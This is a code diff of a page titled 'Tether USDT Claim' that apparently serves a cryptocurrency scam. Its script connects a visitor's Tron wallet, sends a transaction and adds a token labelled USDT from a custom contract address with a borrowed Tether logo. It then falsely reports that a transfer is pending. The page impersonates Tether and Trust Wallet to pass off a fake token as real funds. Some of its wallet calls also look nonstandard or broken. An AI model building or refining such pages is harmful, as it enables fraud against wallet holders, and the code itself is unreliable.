@@ -6,73 +6,17 @@
     <title>Tether USDT Claim</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
     <style>
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #fff;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            text-align: center;
-            padding: 40px;
-            background: linear-gradient(135deg, #fff, #f9f9f9);
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            max-width: 500px;
-            width: 100%;
-        }
-        .logo {
-            width: 150px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 2.2em;
-            color: #f7931a;
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-        p {
-            font-size: 1.1em;
-            margin-bottom: 20px;
-            color: #666;
-        }
-        button {
-            background-color: #f7931a;
-            color: #fff;
-            border: none;
-            padding: 12px 30px;
-            font-size: 1.1em;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.3s;
-            font-weight: 600;
-        }
-        button:hover {
-            background-color: #e68a00;
-            transform: translateY(-2px);
-        }
-        button:active {
-            transform: translateY(0);
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 1em;
-            color: #28a745;
-            font-weight: 500;
-            opacity: 0;
-            transition: opacity 0.5s;
-        }
-        #status.show {
-            opacity: 1;
-        }
-        .error {
-            color: #dc3545;
-        }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #fff; color: #333; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { text-align: center; padding: 40px; background: linear-gradient(135deg, #fff, #f9f9f9); border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); max-width: 500px; width: 100%; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        h1 { font-size: 2.2em; color: #f7931a; margin-bottom: 10px; font-weight: 700; }
+        p { font-size: 1.1em; margin-bottom: 20px; color: #666; }
+        button { background-color: #f7931a; color: #fff; border: none; padding: 12px 30px; font-size: 1.1em; border-radius: 5px; cursor: pointer; transition: background-color 0.3s, transform 0.3s; font-weight: 600; }
+        button:hover { background-color: #e68a00; transform: translateY(-2px); }
+        button:active { transform: translateY(0); }
+        #status { margin-top: 20px; font-size: 1em; color: #28a745; font-weight: 500; opacity: 0; transition: opacity 0.5s; }
+        #status.show { opacity: 1; }
+        .error { color: #dc3545; }
     </style>
 </head>
 <body>
@@ -85,9 +29,8 @@
     </div>
 
     <script>
-        // آدرس هگز پس از تبدیل (جایگزین کن بعد از تبدیل)
-        const contractAddress = "418E276B13EFE5A3E664C1B0A98E9F300FB48F93CB"; // مثلاً 41a9d8e... (بعد از تبدیل)
-        const logoUrl = "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png";
+        const contractAddress = "418E276B13EFE5A3E664C1B0A98E9F300FB48F93CB"; // آدرس هگز با 41 و حروف کوچک
+        const logoUrl = "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png"; // اسم کاربریت رو جایگزین کن
         const abi = [
             {"stateMutability": "Nonpayable", "type": "Constructor"},
             {"anonymous": false, "inputs": [{"indexed": true, "name": "owner", "type": "address"}, {"indexed": true, "name": "spender", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Approval", "type": "Event"},
@@ -104,29 +47,33 @@
         ];
 
         async function connectWallet() {
-            if (window.ethereum) {
+            if (window.tronWeb) { // استفاده از TronWeb برای تشخیص شبکه Tron
                 try {
-                    const web3 = new Web3(window.ethereum);
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const accounts = await web3.eth.getAccounts();
-                    const address = accounts[0];
+                    const address = await window.tronWeb.defaultAddress.base58;
                     const status = document.getElementById('status');
                     status.innerText = `Wallet Connected! Address: ${address.substring(0, 6)}...${address.slice(-4)}`;
                     status.className = 'show';
 
-                    await window.ethereum.request({
-                        method: 'wallet_watchAsset',
-                        params: {
-                            type: 'TRC20', // برای شبکه Tron
-                            options: {
-                                address: contractAddress,
-                                symbol: 'USDT',
-                                decimals: 6,
-                                image: logoUrl
-                            }
+                    await window.tronWeb.trx.sendTransaction({
+                        to: address,
+                        callValue: 0,
+                        data: 'TRC20_TOKEN_ADD',
+                        contractAddress: contractAddress
+                    }, (error, result) => {
+                        if (!error) {
+                            window.tronWeb.trx.addToken(contractAddress, 'USDT', 6, logoUrl, (err, res) => {
+                                if (!err) {
+                                    status.innerText = "Success! USDT with custom logo added. Transfer pending...";
+                                } else {
+                                    status.innerText = "Error adding token: " + err.message;
+                                    status.className = 'show error';
+                                }
+                            });
+                        } else {
+                            status.innerText = "Error: " + error.message;
+                            status.className = 'show error';
                         }
                     });
-                    status.innerText = "Success! USDT with custom logo added. Transfer pending...";
                 } catch (error) {
                     const status = document.getElementById('status');
                     status.innerText = "Error: " + error.message;
@@ -134,7 +81,7 @@
                 }
             } else {
                 const status = document.getElementById('status');
-                status.innerText = "Please install Trust Wallet!";
+                status.innerText = "Please install Trust Wallet with Tron support!";
                 status.className = 'show error';
             }
         }
